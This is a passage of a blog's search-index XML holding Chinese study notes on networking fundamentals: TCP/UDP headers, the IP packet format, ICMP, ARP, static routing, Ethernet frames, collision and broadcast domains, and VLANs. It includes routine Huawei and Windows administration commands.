allow-pass vlan all  //允许所有vlan通过</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]max</span> <span class="string">active-link number 2     //设置活动端口上限</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunkl]lacp</span> <span class="string">preempt enable//开启LACP抢占</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弹性交换网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络通信原理4</title>
      <link href="/posts/netexp4.html"/>
      <url>/posts/netexp4.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络通信原理"><a href="#网络通信原理" class="headerlink" title="网络通信原理"></a>网络通信原理</h1><h2 id="TCP数据包格式"><a href="#TCP数据包格式" class="headerlink" title="TCP数据包格式"></a>TCP数据包格式</h2><h3 id="传输层的作用"><a href="#传输层的作用" class="headerlink" title="传输层的作用"></a>传输层的作用</h3><p><strong>IP层提供点到点的连接</strong></p><p><strong>传输层提供端到端的连接</strong></p><ul><li>端口到端口的连接（不同端口号，代表不同应用程序）</li></ul><p><img src="/../img/img_artical/net_sec/3.4.1.png" alt="3.4.1"></p><h3 id="TCP协议概述"><a href="#TCP协议概述" class="headerlink" title="TCP协议概述"></a>TCP协议概述</h3><p><strong>TCP（Transmission Control Protocol）</strong></p><ul><li>传输控制协议</li><li>可靠的、面向连接的协议</li><li>传输效率低（建立连接需要的时间长）</li></ul><h3 id="UDP协议概述"><a href="#UDP协议概述" class="headerlink" title="UDP协议概述"></a>UDP协议概述</h3><p><strong>UDP（User Datagram Protocol）</strong></p><ul><li>用户数据报文协议</li><li>不可靠的、无连接的服务</li><li>传输效率高（无需专门建立连接，速度快）</li></ul><h3 id="TCP的报文结构"><a href="#TCP的报文结构" class="headerlink" title="TCP的报文结构"></a>TCP的报文结构</h3><p><img src="/../img/img_artical/net_sec/3.4.2.png" alt="3.4.2"></p><ul><li>源端口：源端口和IP地址的作用是标识报文的返回地址</li><li>目的端口：目标端口指明接收方计算机上的应用程序接口<ul><li>备注：源端口是随机的，目标端口是固定的</li></ul></li><li>序列号：seq，使用序列号，保证了tcp传输的有序性</li><li>确认号：ACK，确认号，表示在回复对端，你发的（在该序号之前的所有数据，我都已经收到）</li><li>首部长度：由固定头部和可选项组成， 最小为20字节，最大为60字节</li><li>保留：为将来定义新的用途保留，现在一般置0</li><li>控制位：共6个，每一个标志位表示一个控制功能<ul><li>SYN&#x3D;1：代表请求建立连接（同步位）</li><li>ACK&#x3D;1：代表同意建立连接（确认位）</li><li>FIN&#x3D;1：代表请求断开连接（停止位）</li><li>URG&#x3D;1：代表紧急指针开启—紧急指针：特别着急的数据段优先传递</li><li>PSH&#x3D;1：代表提示接收端应用程序要立刻将数据从缓冲区里面取走.</li><li>RST&#x3D;1：数据没有传输完成断开了，在次请求建议连接</li></ul></li><li>窗口：滑动窗口，代表数据在发送之前，设备间要进行协商，依照最小单位为准发送</li><li>校验和：此校验和是对整个的 TCP 报文段，包括 TCP 头部和 TCP 数据</li></ul><h2 id="TCP连接与断开"><a href="#TCP连接与断开" class="headerlink" title="TCP连接与断开"></a>TCP连接与断开</h2><h3 id="TCP连接与断开-1"><a href="#TCP连接与断开-1" class="headerlink" title="TCP连接与断开"></a>TCP连接与断开</h3><ul><li>TCP连接与断开<ul><li>TCP连接的建立：三次握手、TCP连接的断开：四次挥手</li></ul></li><li>SYN：同步位，TCP需要建立连接时将该值设为1</li><li>ACK：确认位，当该位为1时，用于确认发送方的数据</li><li>FIN：当TCP断开连接时将该位置为1</li></ul><h3 id="TCP的连接"><a href="#TCP的连接" class="headerlink" title="TCP的连接"></a>TCP的连接</h3><p><strong>TCP的连接：三次握手</strong></p><p><img src="/../img/img_artical/net_sec/3.4.3.png" alt="3.4.3"></p><h3 id="TCP的断开"><a href="#TCP的断开" class="headerlink" title="TCP的断开"></a>TCP的断开</h3><p><strong>TCP的断开：四次挥手</strong></p><p><img src="/../img/img_artical/net_sec/3.4.4.png" alt="3.4.4"></p><h2 id="UDP协议解析"><a href="#UDP协议解析" class="headerlink" title="UDP协议解析"></a>UDP协议解析</h2><h3 id="UDP封装格式"><a href="#UDP封装格式" class="headerlink" title="UDP封装格式"></a>UDP封装格式</h3><p><img src="/../img/img_artical/net_sec/3.4.5.png" alt="3.4.5"></p><ul><li><p>源端口：源端口和IP地址的作用是标识报文的返回地址</p></li><li><p>目的端口：目标端口指明接收方计算机上的应用程序接口</p></li><li><p>UDP长度：代表整个UDP的数据报是多大</p></li><li><p>UDP校验和：是一个检查机制，在发送数据包之前检查一下数据包的完整性</p></li></ul><h3 id="UDP的应用"><a href="#UDP的应用" class="headerlink" title="UDP的应用"></a>UDP的应用</h3><table><thead><tr><th align="center">端口</th><th align="center">协议</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">69</td><td align="center">TFTP</td><td align="center">简单文件传输协议</td></tr><tr><td align="center">53</td><td align="center">DNS</td><td align="center">域名服务</td></tr><tr><td align="center">123</td><td align="center">NTP</td><td align="center">网络时间协议</td></tr><tr><td align="center">67&#x2F;68</td><td align="center">DHCP</td><td align="center">动态主机配置协议</td></tr></tbody></table><h2 id="应用层协议介绍"><a href="#应用层协议介绍" class="headerlink" title="应用层协议介绍"></a>应用层协议介绍</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>Domain Name System，域名系统</strong></p><ul><li>用来完成域名与IP地址之间的映射，便于用户对网站的记忆和访问</li><li>端口号为TCP或UDP的53</li></ul><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p><strong>File Transfer Protocol</strong></p><ul><li>文件传输协议</li><li>使用最为广泛的文件传输应用，用于稳定的传输的大容量的文件</li><li>端口号为TCP21和20</li></ul><p><strong>FTP的工作原理</strong></p><ul><li>控制连接：TCP21，用于发送FTP命令信息</li><li>数据连接：TCP20，用于上传、下载数据</li></ul><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p><strong>网络设备管理方式</strong></p><ul><li>本地管理，通过console 线缆管理网络设备。第一次配置设备时使用</li><li>远程管理，通过IP网络，利用远程管理协议管理设备，比如Telnet或SSH</li></ul><p><strong>常见的远程管理协议</strong></p><ul><li>Telnet，多在公司内部使用，传输数据的方式是明文，端口号为TCP23</li><li>SSH，可在任何场景下使用，传输数据的方式是密文，端口号为 TCP22</li></ul><p><strong>Telnet的常见认证方式</strong></p><ul><li>密码认证，远程登录时，仅仅需要密码，认证方式单一，权限控制不精准</li><li>AAA认证，远程登录时，需要用户名和密码，可为不同的用户分配不同权限远程登录权限的控制，更加灵活</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络通信原理3</title>
      <link href="/posts/netexp3.html"/>
      <url>/posts/netexp3.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络通信原理"><a href="#网络通信原理" class="headerlink" title="网络通信原理"></a>网络通信原理</h1><h2 id="IP数据包格式"><a href="#IP数据包格式" class="headerlink" title="IP数据包格式"></a>IP数据包格式</h2><h3 id="网络层概述"><a href="#网络层概述" class="headerlink" title="网络层概述"></a>网络层概述</h3><p><strong>位于OSI模型第三层</strong></p><p><strong>作用</strong></p><ul><li>定义网络设备的逻辑地址，俗称网络层地址（如IP地址）</li><li>在不同的网段之间选择最佳数据转发路径</li></ul><p><strong>协议</strong></p><ul><li>IP协议</li></ul><h3 id="IP数据包格式-1"><a href="#IP数据包格式-1" class="headerlink" title="IP数据包格式"></a>IP数据包格式</h3><p><strong>网络层的所有功能，都是通过该层的诸多协议实现的</strong></p><ul><li>目前网络中，主要的网络层协议是IP 协议</li></ul><p><img src="/../img/img_artical/net_sec/3.3.1.png" alt="3.3.1"></p><p><strong>IP数据报是可变长度的，它由两部分组成：首部和数据</strong></p><ul><li>首部由两部分组成:固定部分和可变部分</li><li>固定部分20字节，可变部分由一些选项组成，最长40字节</li></ul><p><img src="/../img/img_artical/net_sec/3.3.2.png" alt="3.3.2"></p><p><strong>字段作用解析</strong></p><ul><li><p>版本：指的IP地址的版本 （IPv4 或 IPV6）</p></li><li><p>首部长度：数据包的首部长度一共是多少</p></li><li><p>优先级与服务类型：表示数据包是否需要优选传递</p></li><li><p>总长度：表示的是整个数据包的大小，也就是首部+数据</p></li><li><p>标识符、标志、段偏移量：作用将拆开的数据包进行组合（用来数据重组的）</p></li><li><p>TTL值：数据生命周期</p><ul><li>作用：防止数据无限循环转发</li><li>原理：数据包每经过一台路由器，TTL值会减1，当TTL为0时，数据包被丢弃</li></ul></li><li><p>协议号：数据包在网络中传递时所用的协议</p><ul><li>1 – ICMP</li><li>6 – TCP</li><li>17 – UDP</li></ul></li><li><p>首部校验和：是用来做数据包核对用的，确定数据包是否是完整，如果是就接收，如果不是完整的数据包则丢弃</p></li><li><p>源IP地址 ：表示发送这个数据包的设备的IP地址</p></li><li><p>目标IP地址：表示接收这个数据包的设备的IP地址</p></li><li><p>可选项：他是一个可变长度，取值范围：0-40个字节 一般数据包中不是加该选项的</p></li><li><p>数据：他是应用层发出的数据—–在数据包中体现，单独看不到</p></li></ul><h2 id="IP地址解析"><a href="#IP地址解析" class="headerlink" title="IP地址解析"></a>IP地址解析</h2><h3 id="网络与广播地址"><a href="#网络与广播地址" class="headerlink" title="网络与广播地址"></a>网络与广播地址</h3><p><strong>网络地址</strong></p><ul><li>主机位全为0的IP地址</li><li>表示的是一个网络范围，仅仅表示一个区域，不代表任何一个主机</li><li>例如：192.168.1.0 255.255.25.0，是网络地址</li></ul><p><strong>广播地址</strong></p><ul><li>主机位全为1的IP地址</li><li>表示的是一个网络范围内的所有主机&#x2F;设备</li><li>例如：192.168.1.255 255.255.255.0，是广播地址</li></ul><h3 id="可用IP地址"><a href="#可用IP地址" class="headerlink" title="可用IP地址"></a>可用IP地址</h3><p><strong>可用IP地址范围及广播地址</strong></p><p><img src="/../img/img_artical/net_sec/3.3.3.png" alt="3.3.3"></p><h2 id="网络层常见协议"><a href="#网络层常见协议" class="headerlink" title="网络层常见协议"></a>网络层常见协议</h2><h3 id="ICMP协议概述"><a href="#ICMP协议概述" class="headerlink" title="ICMP协议概述"></a>ICMP协议概述</h3><p><strong>概述</strong></p><ul><li>ICMP（Internet Control Message Protocol），Internet控制消息协议</li><li>位于 OSI 模型第三层，即网络层</li><li>协议号：1</li></ul><p><strong>作用</strong></p><ul><li>在IP网络中发送控制消息，反馈可能发生在通信环境中的各种问题，从而为网络连通性测试以及网络故障定位提供有效指示信息</li></ul><p><strong>场景示例</strong></p><ul><li>当路由器收到一个不能被送到最终目的地的数据包时，路由器会向源主机发送一个ICMP主机不可达的消息</li></ul><p><img src="/../img/img_artical/net_sec/3.3.4.png" alt="3.3.4"></p><h3 id="ICMP协议应用"><a href="#ICMP协议应用" class="headerlink" title="ICMP协议应用"></a>ICMP协议应用</h3><p><strong>测试工具-Ping</strong></p><ul><li>测试两个设备之间的连通性</li><li>使用的是ICMP协议的数据包</li></ul><p><strong>测试命令</strong></p><ul><li>ping  目标IP</li><li>ping  目标IP  -t          &#x2F;&#x2F;一直ping目标地址</li><li>ping  目标IP  -c  X     &#x2F;&#x2F;指定ping几次</li><li>ping  目标IP  -i   X     &#x2F;&#x2F;指定ping包的字节大小</li><li>tracert  目标IP          &#x2F;&#x2F;路由追踪</li></ul><p><strong>Echo Request，请求报文</strong></p><p><strong>Echo Reply，响应报文</strong></p><p><img src="/../img/img_artical/net_sec/3.3.5.png" alt="3.3.5"></p><p><strong>常见的Ping反馈结果</strong></p><ul><li><p>连接建立成功，Reply from 目标地址….</p></li><li><p>目标主机不可达，Destination host unreachable</p><ul><li>同网段中没有这个IP地址，或IP地址错误</li><li>跨网段通信时，本主机没有填写网关地址</li></ul></li><li><p>请求时间超时，Request timed out</p><ul><li>对方主机没有填写网关地址</li><li>对方的防火墙阻断了</li></ul></li></ul><h3 id="ARP协议概述"><a href="#ARP协议概述" class="headerlink" title="ARP协议概述"></a>ARP协议概述</h3><p><strong>ARP（address resolution protocol）：地址解析协议</strong></p><ul><li>属于OSI 模型第三层（网络层）</li><li>主要作用是:基于目标IP地址获得对应的目标MAC地址，从而完成数据的2层头部封装实现数据的快速转发</li></ul><p><strong>ARP报文类型</strong></p><ul><li>ARP请求报文，源设备以广播的方式发送，向所有设备请求MAC地址</li><li>ARP回应报文，目标设备以单播的方式回应，直接返回给“源设备</li></ul><p><strong>ARP核心工作表</strong></p><ul><li>ARP表，包含的是IP地址与MAC地址的对应关系条目</li><li>ARP条目分为静态和动态两种类型</li><li>动态ARP条目的存活时间是1200s</li></ul><p><strong>任何设备发送数据的原理</strong></p><ul><li>任何设备在发送数据包之前，必须检查ARP 表，查看包含去往目标IP地址时所使用的MAC地址</li><li>如果ARP表包含目标IP地址对应的条目，则使用目标MAC封装数据</li><li>如果ARP表不包含对应的ARP条目信息，则发送ARP请求，获得目标MAC</li></ul><p><strong>ARP常用命令</strong></p><ul><li>PC&gt;arp  -a &#x2F;&#x2F;查看arp缓存表<br>Internet Address   Physical Address   Type<br>192.168.1.2         54-89-98-B9-74-25  dynamic (动态)</li><li>PC&gt;arp -d  &#x2F;&#x2F;清空arp缓存表</li><li>PC&gt;arp -s 192.168.1.2  54-89-98-B9-74-25  &#x2F;&#x2F;添加静态的ARP表记录</li></ul><h3 id="ARP工作原理"><a href="#ARP工作原理" class="headerlink" title="ARP工作原理"></a>ARP工作原理</h3><ul><li>设备刚开机时，ARP表是空的</li><li>主机10.1.1.1要与10.1.1.2通信，首先以广播方式发送ARP 请求</li></ul><p><img src="/../img/img_artical/net_sec/3.3.6.png" alt="3.3.6"></p><ul><li>所有主机都接收到10.1.1.1的ARP请求报文，但只有10.1.1.2给它一个单播回复，并将10.1.1.1的MAC地址保存在自己的ARP表</li></ul><p><img src="/../img/img_artical/net_sec/3.3.7.png" alt="3.3.7"></p><ul><li>主机10.1.1.1将10.1.1.2的MAC地址保存到ARP缓存中，然后就可以发送数据</li></ul><h2 id="路由原理和配置"><a href="#路由原理和配置" class="headerlink" title="路由原理和配置"></a>路由原理和配置</h2><h3 id="什么是路由"><a href="#什么是路由" class="headerlink" title="什么是路由"></a>什么是路由</h3><p><strong>将数据包从一个网段发送到另一个网段</strong></p><ul><li>需要依靠具备路由功能的设备来完成</li><li>常见的路由设备有路由器或三层交换机、防火墙</li></ul><h3 id="路由器如何工作"><a href="#路由器如何工作" class="headerlink" title="路由器如何工作"></a>路由器如何工作</h3><p><strong>根据路由表选择最佳路径</strong></p><ul><li>每个路由器都维护着一张路由表，这是转发数据包的关键</li><li>每条路由表记录指明了：到达某个子网或主机应从路由器的哪个物理端口发送，通过此端口可到达该路径的下一个路由器的地址</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]display</span> <span class="string">ip routing-table</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">目的地址</span>   <span class="string">/掩码        协议      优先级      开销值              下一跳            出接口 </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Destination/Mask</span>      <span class="string">Proto     Pre        Cost               NextHop          Interface </span></span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="路由表的形成"><a href="#路由表的形成" class="headerlink" title="路由表的形成"></a>路由表的形成</h3><p><strong>路由表是在路由器中维护的路由条目的集合，路由器根据路由表做路径选择，路由表是怎么形成的呢?</strong></p><p><strong>直连网段</strong></p><ul><li>配置接口IP地址</li><li>并且接口状态up</li></ul><p><strong>非直连网段</strong></p><p><img src="/../img/img_artical/net_sec/3.3.8.png" alt="3.3.8"></p><h3 id="路由的类型"><a href="#路由的类型" class="headerlink" title="路由的类型"></a>路由的类型</h3><p><strong>依据来源的不同，路由条目可以分为三种类型</strong></p><ul><li>通过链路层协议发现的路由称为直连路由，优先级为0</li><li>通过网络管理员手动添加的路由称为静态路由，优先级为60</li><li>通过动态路由协议自动发现的路由称为动态路由，ospf路由优先级为10</li></ul><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p><strong>静态路由：</strong></p><ul><li>由管理员手动配置添加，为单向条目</li><li>通信双方的路由器都需要配置路由，否则会导致数据包有去无回</li></ul><p><img src="/../img/img_artical/net_sec/3.3.9.png" alt="3.3.9"></p><h3 id="静态路由配置命令"><a href="#静态路由配置命令" class="headerlink" title="静态路由配置命令"></a>静态路由配置命令</h3><p><strong>使用ip route-static 命令</strong></p><ul><li>指定到达的目的网络</li><li>基本格式:</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei]ip</span> <span class="string">route-static 目标网络 子网掩码 下一跳地址</span></span><br></pre></td></tr></table></figure><h2 id="配置默认路由"><a href="#配置默认路由" class="headerlink" title="配置默认路由"></a>配置默认路由</h2><h3 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h3><p><strong>默认路由</strong></p><ul><li>默认的目标网络为0.0.0.0&#x2F;0，可以匹配任何目标地址</li><li>只有路由表中找不到任何明细路由时，才会使用默认路由（缺省路由）</li><li>默认路由，可以手动添加，也可以让路由器动态学习</li></ul><h3 id="默认路由配置命令"><a href="#默认路由配置命令" class="headerlink" title="默认路由配置命令"></a>默认路由配置命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 0.0.0.0 0 下一跳地址</span><br></pre></td></tr></table></figure><h2 id="路由器转发数据包的过程"><a href="#路由器转发数据包的过程" class="headerlink" title="路由器转发数据包的过程"></a>路由器转发数据包的过程</h2><p><img src="/../img/img_artical/net_sec/3.3.10.png" alt="3.3.10"></p><p><img src="/../img/img_artical/net_sec/3.3.11.png" alt="3.3.11"></p><p><img src="/../img/img_artical/net_sec/3.3.12.png" alt="3.3.12"></p><p><img src="/../img/img_artical/net_sec/3.3.13.png" alt="3.3.13"></p><p><img src="/../img/img_artical/net_sec/3.3.14.png" alt="3.3.14"></p><p><img src="/../img/img_artical/net_sec/3.3.15.png" alt="3.3.15"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络通信原理2</title>
      <link href="/posts/netexp2.html"/>
      <url>/posts/netexp2.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络通信原理"><a href="#网络通信原理" class="headerlink" title="网络通信原理"></a>网络通信原理</h1><h2 id="数据链路层解析"><a href="#数据链路层解析" class="headerlink" title="数据链路层解析"></a>数据链路层解析</h2><h3 id="数据链路层概述"><a href="#数据链路层概述" class="headerlink" title="数据链路层概述"></a>数据链路层概述</h3><p><strong>位于网络层与物理层之间</strong></p><p><img src="/../img/img_artical/net_sec/3.2.1.png" alt="3.2.1"></p><p><strong>功能</strong></p><ul><li>数据链路的建立、维护与拆除</li><li>帧形成、帧传输、帧同步</li><li>帧的差错恢复和流量控制</li></ul><p><strong>协议</strong></p><ul><li>Ethernet（以太网）</li></ul><h3 id="以太网概述"><a href="#以太网概述" class="headerlink" title="以太网概述"></a>以太网概述</h3><p><strong>以太网</strong></p><ul><li>以太网（Ethernet）是一种计算机局域网技术</li><li>以太网是目前最通用，使用最广泛的局域网通信协议标准</li><li>通常使用的局域网即”以太网”</li></ul><p><strong>主机A与主机B之间的通信，可能遇见的问题</strong></p><ul><li>如何区分不同设备</li><li>如何识别设备发送的数据</li></ul><p><strong>以太网地址 (MAC)</strong></p><ul><li>MAC地址用来标识以太网上唯一的一个设备</li><li>长度：48个bit  (6个字节）</li><li>组成：24个bit的厂商标识+24个bit的网卡编号</li><li>表示方式：使用12位的16进制数表示的  如：98-FA-9B-EE-AA-04</li><li>MAC地址的第8位为0表示单播地址，为1表示组播地址（每一个物理网卡都有一个全球唯一的MAC地址）</li><li>48位都为1 表示广播地址</li></ul><p><img src="/../img/img_artical/net_sec/3.2.2.png" alt="3.2.2"></p><h3 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet II帧格式"></a>Ethernet II帧格式</h3><ul><li>目的地址：接收主机的MAC地址（6个字节&#x3D;48个bit）</li><li>源地址：发送数据主机的MAC地址</li><li>类型：用来表示上一层使用的什么协议，如果是0x800 代表上层协议是 ip协议</li><li>数据：要传输的数据（包含IP包头，包含TCP包头，包含数据）</li><li>帧校验序列：数据校验，检查数据是否损坏，好的就接收，坏的就丢弃</li><li>以太网帧的数据长度范围46-1500 字节 （净重）</li><li>以太网帧的长度范围64-1518 字节 （毛重）</li></ul><p><img src="/../img/img_artical/net_sec/3.2.3.png" alt="3.2.3"></p><h2 id="理解冲突域"><a href="#理解冲突域" class="headerlink" title="理解冲突域"></a>理解冲突域</h2><h3 id="单工、半双工与全双工"><a href="#单工、半双工与全双工" class="headerlink" title="单工、半双工与全双工"></a>单工、半双工与全双工</h3><p><strong>单工</strong></p><ul><li>只有一个信道，传输方向只能是单向的</li><li>传输数据的信道只有一个，只能接收数据，不能回复数据（类似BB机）</li></ul><p><strong>半双工</strong></p><ul><li>只有一个信道，在同一时刻，只能是单向传输</li><li>传输数据的信道只有一个，可以接收数据，也可以回复数据，但是不能同时进行（类似：对讲机）</li></ul><p><strong>全双工</strong></p><ul><li>双信道，同时可以有双向数据传输</li><li>传输数据的信道有两个，接口可以在同一时刻接收数据和发送数据（类似：电话）</li></ul><p><img src="/../img/img_artical/net_sec/3.2.4.png" alt="3.2.4"></p><h3 id="冲突域概述"><a href="#冲突域概述" class="headerlink" title="冲突域概述"></a>冲突域概述</h3><p><strong>什么是冲突域</strong></p><ul><li>早期以太网是多个网络节点共享同一链路，在同一传输介质上的多个节点共享同一条链路，多个节点争用链路的使用权，这样就会发生冲突</li><li>连接在同一传输介质上的产生冲突的所有节点的集合就是一个冲突域</li></ul><p><img src="/../img/img_artical/net_sec/3.2.5.png" alt="3.2.5"></p><h3 id="分割冲突域"><a href="#分割冲突域" class="headerlink" title="分割冲突域"></a>分割冲突域</h3><p><strong>为了提高传输效率，分割冲突域</strong></p><p><img src="/../img/img_artical/net_sec/3.2.6.png" alt="3.2.6"></p><h3 id="交换机分割冲突域"><a href="#交换机分割冲突域" class="headerlink" title="交换机分割冲突域"></a>交换机分割冲突域</h3><p><strong>交换机分割冲突域</strong></p><ul><li>早期的以太网利用物理层设备HUB来构建网络，不能隔绝冲突</li><li>交换机设备取代了HUB设备组建以太网后，交换机的每个接口访问另一个接口时，都有一条专有的线路，不会产生冲突，所以交换机的每个接口，都是一个不同的冲突域，所以交换机可以分割冲突域</li><li>全双工从根本上解决了以太网的冲突问题</li></ul><h2 id="交换机工作原理"><a href="#交换机工作原理" class="headerlink" title="交换机工作原理"></a>交换机工作原理</h2><h3 id="交换机概述"><a href="#交换机概述" class="headerlink" title="交换机概述"></a>交换机概述</h3><p><strong>交换机是用来连接局域网的主要设备</strong></p><ul><li>交换机能够根据以太网帧中目标MAC地址智能的转发数据，因此交换机工作在数据链路层</li><li>交换机可以分割冲突域，实现全双工通信</li><li>交换机转发数据，主要依靠的是核心工作表：MAC地址表</li></ul><h3 id="交换机工作原理-1"><a href="#交换机工作原理-1" class="headerlink" title="交换机工作原理"></a>交换机工作原理</h3><p><strong>交换机的转发原理</strong></p><ul><li>初始状态，MAC地址表是空的</li><li>MAC地址学习</li><li>广播未知数据帧</li><li>接收方回应</li><li>交换机实现单播通信</li></ul><p><strong>学习</strong></p><ul><li>学习数据帧源MAC地址，生成MAC地址表，并将源MAC地址和对应的接口号写入MAC地址表</li></ul><p><img src="/../img/img_artical/net_sec/3.2.7.png" alt="3.2.7"></p><p><strong>广播</strong></p><ul><li>若目标MAC地址在MAC地址表中没有，交换机就向该数据帧的入接口外的其他所有接口广播未知目标MAC地址</li></ul><p><img src="/../img/img_artical/net_sec/3.2.8.png" alt="3.2.8"></p><p><img src="/../img/img_artical/net_sec/3.2.9.png" alt="3.2.9"></p><p><strong>转发</strong></p><ul><li>交换机根据MAC地址表和目标MAC地址，单播转发数据帧</li></ul><p><img src="/../img/img_artical/net_sec/3.2.10.png" alt="3.2.10"></p><p><strong>更新</strong></p><ul><li>交换机MAC地址表中的转发条目是动态学习到的，老化时间是300秒</li><li>如果发现一个帧的入接口和MAC地址表中该源MAC地址所对应的接口不同，交换机将MAC地址重新学习到新的接口</li></ul><h3 id="查看MAC地址表"><a href="#查看MAC地址表" class="headerlink" title="查看MAC地址表"></a>查看MAC地址表</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;display</span> <span class="string">mac-address  </span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">address table of slot 0:</span></span><br><span class="line"><span class="attr">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">MAC</span> <span class="string">Address    VLAN/       PEVLAN CEVLAN Port            Type      LSP/LSR-ID  </span></span><br><span class="line">               <span class="attr">VSI/SI</span>                                              <span class="string">MAC-Tunnel  </span></span><br><span class="line"><span class="attr">-------------------------------------------------------------------------------</span></span><br><span class="line"> <span class="attr">5489-9802-3b6e</span> <span class="string">1           -      -      GE0/0/1          dynamic   0/-         </span></span><br><span class="line"> <span class="attr">5489-9886-7447</span> <span class="string">1           -      -      GE0/0/2          dynamic   0/-         </span></span><br><span class="line"> <span class="attr">5489-9899-2a4a</span> <span class="string">1           -      -      GE0/0/3          dynamic   0/-         </span></span><br><span class="line"><span class="attr">-------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><h2 id="理解广播域"><a href="#理解广播域" class="headerlink" title="理解广播域"></a>理解广播域</h2><h3 id="广播域概述"><a href="#广播域概述" class="headerlink" title="广播域概述"></a>广播域概述</h3><p><strong>定义</strong></p><ul><li>广播域指接收同一广播消息的节点的集合，比如：一个节点发送目的MAC地址为全FFFF-FFFF-FFFF的广播报文，其余能够收到这条广播报文的节点的集合，就是一个广播域</li><li>通常”一个IP网段，就是一个广播域”</li></ul><p><img src="/../img/img_artical/net_sec/3.2.11.png" alt="3.2.11"></p><h3 id="广播域过大所带来的问题"><a href="#广播域过大所带来的问题" class="headerlink" title="广播域过大所带来的问题"></a>广播域过大所带来的问题</h3><p><strong>广播域中网络节点过多所带来的问题</strong></p><ul><li>一个广播域中的网络节点越多，广播报文也必然会越多</li><li>当广播报文越多，当前广播域的带宽占用就越多，网络不可用风险增大</li><li>当广播报文越多，当前广播域中的设备资源占用高，转发数据速度慢</li><li>所以当一个广播域中的节点过多，网络的稳定性和安全性会越低</li></ul><h2 id="VLAN概述"><a href="#VLAN概述" class="headerlink" title="VLAN概述"></a>VLAN概述</h2><h3 id="VLAN概述-1"><a href="#VLAN概述-1" class="headerlink" title="VLAN概述"></a>VLAN概述</h3><p><strong>什么是VLAN</strong></p><ul><li>VirtualLAN(虚拟局域网)</li><li>将一个物理的局域网(LAN) 逻辑上划分成多个虚拟局域网 (VLAN) 的通信技术</li></ul><p><strong>为什么引入VLAN</strong></p><ul><li>交换机分割了冲突域，但是不能分割广播域</li><li>随着交换机端口数量的增多，网络中广播增多，降低了网络的效率</li><li>为了分割广播域，引入了VLAN</li></ul><p><strong>VLAN分割广播域</strong></p><p><img src="/../img/img_artical/net_sec/3.2.12.png" alt="3.2.12"></p><p><strong>VLAN的作用</strong></p><ul><li>广播控制</li><li>安全性</li><li>带宽利用</li><li>延迟</li></ul><h3 id="VLAN的划分种类"><a href="#VLAN的划分种类" class="headerlink" title="VLAN的划分种类"></a>VLAN的划分种类</h3><p><strong>基于端口划分的静态VLAN（常见）</strong></p><ul><li>通常是基于接口划分</li></ul><p><img src="/../img/img_artical/net_sec/3.2.13.png" alt="3.2.13"></p><p><strong>基于MAC地址划分的动态VLAN</strong></p><h3 id="标准以太网帧及带有vlan-标签的数据帧"><a href="#标准以太网帧及带有vlan-标签的数据帧" class="headerlink" title="标准以太网帧及带有vlan 标签的数据帧"></a>标准以太网帧及带有vlan 标签的数据帧</h3><ul><li><p>Vlan数据帧（标准）：目标地址+源地址+类型+数据+帧校验序列</p></li><li><p>VLAN数据帧：目的地址+源地址+【Vlan-Tag】+类型+数据+帧校验序列</p></li><li><p>注：vlan-tag：共4个字节，分为4个字段，其中最后一个字段VID表示vlan编号（12个bit），2的12次方是4096，所以0-4095个vlan,但是0和4095是被保留的，所以一个交换机中可以创建的vlan编号最大到4094</p></li></ul><h2 id="VLAN配置"><a href="#VLAN配置" class="headerlink" title="VLAN配置"></a>VLAN配置</h2><h3 id="PVID"><a href="#PVID" class="headerlink" title="PVID"></a>PVID</h3><p><strong>PVID: Port Default VLANID，也称缺省VLAN</strong></p><ul><li>表示接口所属的VLAN</li><li>每个接口都有一个PVID</li><li>交换机中所有接口的PVID默认都为VLAN1，但是可以手动修改</li></ul><h3 id="配置VLAN的步骤"><a href="#配置VLAN的步骤" class="headerlink" 